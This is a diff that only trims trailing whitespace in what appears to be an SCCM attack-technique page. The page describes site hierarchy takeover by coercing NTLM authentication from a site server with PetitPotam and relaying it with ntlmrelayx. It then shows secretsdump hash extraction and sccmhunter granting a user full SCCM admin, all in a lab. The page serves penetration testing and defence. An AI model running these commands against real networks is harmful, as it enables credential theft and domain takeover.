@@ -12,7 +12,7 @@ Hierarchy Takeover via NTLM coercion and relay to SMB between primary and passiv
 ### Coercion
 - Valid Active Directory domain credentials
 - Connectivity to SMB (TCP/445) on a coercion target:
-    - TAKEOVER-7.1: Coerce primary site server 
+    - TAKEOVER-7.1: Coerce primary site server
     - TAKEOVER-7.2: Coerce passive site server
 - Connectivity from the coercion target to SMB (TCP/445) on the relay server
 - Coercion target settings:
@@ -22,7 +22,7 @@ Hierarchy Takeover via NTLM coercion and relay to SMB between primary and passiv
     - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target [DEFAULT]
 
 ### Relay
-- Connectivity from the relay server to SMB on target host 
+- Connectivity from the relay server to SMB on target host
 - SMS Provider role installed on target preferred (default) but not required
 - Relay target settings:
     - `RequireSecuritySignature` = `0` or not present [DEFAULT]
@@ -33,7 +33,7 @@ Hierarchy Takeover via NTLM coercion and relay to SMB between primary and passiv
     - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target [DEFAULT]
 
 ## Summary
-For high availability configurations, the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover. 
+For high availability configurations, the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server shares the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover.
 
 During setup, the passive site server is [required](https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability#configurations-for-the-site-server-in-passive-mode) to be a member of the active site server's local Administrators group. An attacker who is able to successfully coerce NTLM authentication from a active or passive site server via SMB and relay it to SMB on a remote active or passive site server to compromise the host can either:
 1. Authenticate to its own hosted SMS Provider as the site server
@@ -63,14 +63,14 @@ The steps to execute TAKEOVER-7.1 and TAKEOVER-7.2 are the same except the coerc
     - The *SCCM.INTERNAL.LAB* host is the active site server and the *PASSIVE.INTERNAL.LAB* host is the passive site server
     - SMB signing is disabled on both systems
     ```
-    [04:24:43 PM] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                    
-    [04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
-                        | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |                                                                                                                                          
-                        +======================+===================+=================+==============+===============+==========+===========+=========+                                                                                                                                          
-                        | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |                                                                                                                                          
-                        +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
-                        | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |                                                                                                                                          
-                        +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+ 
+    [04:24:43 PM] INFO     [+] Finished profiling Site Servers.
+    [04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+
+                        | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |
+                        +======================+===================+=================+==============+===============+==========+===========+=========+
+                        | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |
+                        +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+
+                        | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |
+                        +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+
     ```
 
 2. On the attacker relay server, start `ntlmrelayx`, targeting the SMB service on the primary site server identified in the previous step.  The `-socks` flag is used to hold the authenticated session open:
@@ -112,7 +112,7 @@ The steps to execute TAKEOVER-7.1 and TAKEOVER-7.2 are the same except the coerc
 
     ```
     ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <PASSIVE_SITE_SERVER_IP> 
+    └─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd <NTLMRELAYX_LISTENER_IP> <PASSIVE_SITE_SERVER_IP>
 
     Trying pipe lsarpc
     [-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
@@ -141,7 +141,7 @@ The steps to execute TAKEOVER-7.1 and TAKEOVER-7.2 are the same except the coerc
  5. Proxy `secretsdump.py` in the context of the passive site server through the authenticated session to authenticate to the primary site server and recover its hashed credential:
     ```
     ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
-    └─#  proxychains secretsdump.py lab/passive\$@sccm.internal.lab                     
+    └─#  proxychains secretsdump.py lab/passive\$@sccm.internal.lab
     [proxychains] config file found: /etc/proxychains4.conf
     [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
     [proxychains] DLL init: proxychains-ng 4.16
@@ -158,7 +158,7 @@ The steps to execute TAKEOVER-7.1 and TAKEOVER-7.2 are the same except the coerc
     [*] Dumping cached domain logon information (domain/username:hash)
     INTERNAL.LAB/Administrator:$DCC2$10240#Administrator#dfb35a65f92d8af602f08e358a58dc42
     [*] Dumping LSA Secrets
-    [*] $MACHINE.ACC 
+    [*] $MACHINE.ACC
     lab\SCCM$:aes256-cts-hmac-sha1-96:76bf72e59677dfe072fd6609ccdc1343d318f7cc557b25588b36046747f80172
     lab\SCCM$:aes128-cts-hmac-sha1-96:b2d7f1a79de08211ae6a518c82a715f4
     lab\SCCM$:des-cbc-md5:5de98a07aefb983e
@@ -168,36 +168,36 @@ The steps to execute TAKEOVER-7.1 and TAKEOVER-7.2 are the same except the coerc
     ```
     ┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
     └─# python3 sccmhunter.py admin -u sccm\$ -p aad3b435b51404eeaad3b435b51404ee:6963d86f6d65497d7b2126d44e6cdb4e -ip 10.10.100.121
-        
-    [06:53:08 PM] INFO     [!] Enter help for extra shell commands                                                                                               
-    () C:\ >> show_admins 
-    [06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
-    [06:53:11 PM] INFO     Current Full Admin Users:                                                                                                             
-    [06:53:11 PM] INFO     lab\Administrator                                                                                                                     
+
+    [06:53:08 PM] INFO     [!] Enter help for extra shell commands
+    () C:\ >> show_admins
+    [06:53:11 PM] INFO     Tasked SCCM to list current SMS Admins.
+    [06:53:11 PM] INFO     Current Full Admin Users:
+    [06:53:11 PM] INFO     lab\Administrator
     () (C:\) >> get_user specter
-    [06:53:13 PM] INFO     [*] Collecting users...                                                                                                               
-    [06:53:13 PM] INFO     [+] User found.                                                                                                                       
-    [06:53:14 PM] INFO     ------------------------------------------                                                                                            
-                        DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab                                                                          
-                        FullDomainName: INTERNAL.LAB                                                                                                          
-                        FullUserName: specter                                                                                                              
-                        Mail:                                                                                                                                 
-                        NetworkOperatingSystem: Windows NT                                                                                                    
-                        ResourceId: 2063597574                                                                                                                
-                        sid: S-1-5-21-2391214593-4168590120-2599633397-1109                                                                                   
-                        UniqueUserName: lab\specter                                                                                                           
-                        UserAccountControl: 66048                                                                                                             
-                        UserName: specter                                                                                                           
-                        UserPrincipalName: specter@internal.lab                                                                                        
-                        ------------------------------------------                                                                                            
+    [06:53:13 PM] INFO     [*] Collecting users...
+    [06:53:13 PM] INFO     [+] User found.
+    [06:53:14 PM] INFO     ------------------------------------------
+                        DistinguishedName: CN=specter,OU=DOMUSERS,DC=internal,DC=lab
+                        FullDomainName: INTERNAL.LAB
+                        FullUserName: specter
+                        Mail:
+                        NetworkOperatingSystem: Windows NT
+                        ResourceId: 2063597574
+                        sid: S-1-5-21-2391214593-4168590120-2599633397-1109
+                        UniqueUserName: lab\specter
+                        UserAccountControl: 66048
+                        UserName: specter
+                        UserPrincipalName: specter@internal.lab
+                        ------------------------------------------
     () (C:\) >> add_admin specter S-1-5-21-2391214593-4168590120-2599633397-1109
-    [06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.                                                                                 
-    [06:53:19 PM] INFO     [+] Successfully added specter as an admin.                                                                                           
-    () (C:\) >> show_admins 
-    [06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.                                                                                               
-    [06:53:20 PM] INFO     Current Full Admin Users:                                                                                                             
-    [06:53:20 PM] INFO     lab\Administrator                                                                                                                     
-    [08:46:39 PM] INFO     specter 
+    [06:53:19 PM] INFO     Tasked SCCM to add specter as an administrative user.
+    [06:53:19 PM] INFO     [+] Successfully added specter as an admin.
+    () (C:\) >> show_admins
+    [06:53:20 PM] INFO     Tasked SCCM to list current SMS Admins.
+    [06:53:20 PM] INFO     Current Full Admin Users:
+    [06:53:20 PM] INFO     lab\Administrator
+    [08:46:39 PM] INFO     specter
     ```
 
 ## References
